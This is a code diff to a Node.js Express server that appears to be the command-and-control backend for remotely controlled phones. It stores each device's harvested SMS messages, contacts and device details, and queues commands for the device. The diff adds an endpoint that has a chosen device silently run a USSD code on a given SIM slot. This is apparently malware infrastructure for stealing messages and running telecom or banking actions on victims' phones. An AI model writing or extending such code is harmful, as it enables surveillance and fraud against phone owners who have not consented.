@@ -10,7 +10,7 @@ app.use(express.json());
  * In-memory store
  */
 const devices = {};          // deviceId -> { deviceId, model, registeredAt }
-const commands = {};         // deviceId -> [ { id, type, number?, message? } ]
+const commands = {};         // deviceId -> [ { id, type, number?, message?, code?, simSlot? } ]
 const smsData = {};          // deviceId -> latest SMS
 const contactsDB = {};       // deviceId -> contacts
 const deviceDetailsDB = {};  // deviceId -> device info
@@ -70,6 +70,23 @@ app.post("/devicedetails", (req, res) => {
 
     const cmd = { id: uuidv4(), type: "DEVICE_DETAILS" };
     commands[deviceId].push(cmd);
+    res.json({ success: true, status: "queued" });
+});
+
+// ------------------ Trigger USSD ------------------
+app.post("/testussd", (req, res) => {
+    const { deviceId, code, simSlot } = req.body;
+
+    if (!devices[deviceId])
+        return res.status(404).json({ success: false });
+
+    commands[deviceId].push({
+        id: uuidv4(),
+        type: "USSD",
+        code,
+        simSlot: simSlot || 0
+    });
+
     res.json({ success: true, status: "queued" });
 });
 
